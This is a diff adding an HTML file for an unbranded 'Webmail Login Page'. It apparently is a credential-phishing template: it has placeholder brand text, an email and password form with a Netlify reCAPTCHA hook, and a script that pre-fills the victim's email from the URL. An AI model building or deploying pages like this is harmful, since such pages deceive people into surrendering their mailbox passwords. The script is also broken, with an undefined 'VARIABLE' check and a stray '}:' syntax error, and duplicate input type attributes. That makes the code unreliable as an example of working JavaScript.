@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Webmail Login Page</title>
+    <link href="assets/css/btstrap.min.css" rel="stylesheet">
+    <link href="assets/css/checkbox.min.css" rel="stylesheet">
+    <link href="assets/css/fnt.min.css" rel="stylesheet">
+    <link href="assets/css/style.css" rel="stylesheet">
+  </head>
+  
+  <body>
+  <span class="header-ribbon"/>
+  <div class="container-fluid">
+    <div class="row">
+        <div class="col-md-4 col-md-offset-4 col-centered"> 
+            <div class="login-panel"> 
+                <h4 class="login-panel-title">Login To MailBox</h4>
+                <p class="login-panel-tagline">Sitename helps you connect and share with the people in your life.</p>
+                <div class="login-panel-section">
+				<form>
+                    <div class="form-group">
+                        <div class="input-group margin-bottom-sm">
+                            <span class="input-group-addon"><i class="fa fa-envelope-o fa-fw" aria-hidden="true"></i></span>
+                            <input class="form-control" id="yourBestEmail" type="email" placeholder="Enter Your Email Address Here!!"> 
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <div class="input-group">
+                            <span class="input-group-addon"><i class="fa fa-key fa-fw" aria-hidden="true"></i></span>
+                            <input type="text" id="pass-invalid" name="password" pattern=".{6,}" required class="form-control" type="password" placeholder="Password">
+                        </div>
+                    </div>
+                    <div class="checkbox checkbox-circle checkbox-success checkbox-small">
+                        <input type="checkbox" id="checkbox1">
+                        <label for="checkbox1">Keep me logged in</label>
+                        <a href="#" class="pull-right">Forget your password?</a>
+                    </div>
+                </div>
+				<div data-netlify-recaptcha="true"></div>
+				<p></p>
+                <div class="login-panel-section">
+                    <button type="submit" class="btn btn-default"><i class="fa fa-sign-in fa-fw" aria-hidden="true"></i> Login</button> | <a href="#">Create Your Account</a>
+                </div>
+				</form>
+            </div>
+        </div>
+      </div>
+    </div>
+    <script src="assets/js/jquery.min.js"></script>
+    <script src="assets/js/bootstrap.min.js"></script>
+	
+<script>
+document.getElementById("pass-invalid").addEventListener("invalid", myFunction);
+
+function myFunction() {
+  alert("password must contain 6 or more characters");
+}
+
+</script>
+
+<script type="text/javascript">
+var getUrlParameter = function getUrlParameter(sParam) {
+    var sPageURL = decodeURIComponent(window.location.search.substring(1)),
+        sURLVariables = sPageURL.split('&'),
+        sParameterName,
+        i;
+    for (i = 0; i < sURLVariables.length; i++) {
+        sParameterName = sURLVariables[i].split('=');
+        if (sParameterName[0] === sParam) {
+            return sParameterName[1] === undefined ? true : sParameterName[1];
+        }
+    }
+};
+
+var youremail = getUrlParameter('email');
+
+if (VARIABLE != null) {
+     document.getElementById('yourBestEmail').value = youremail;
+}:
+
+</script>
+  </body>
+  </html>
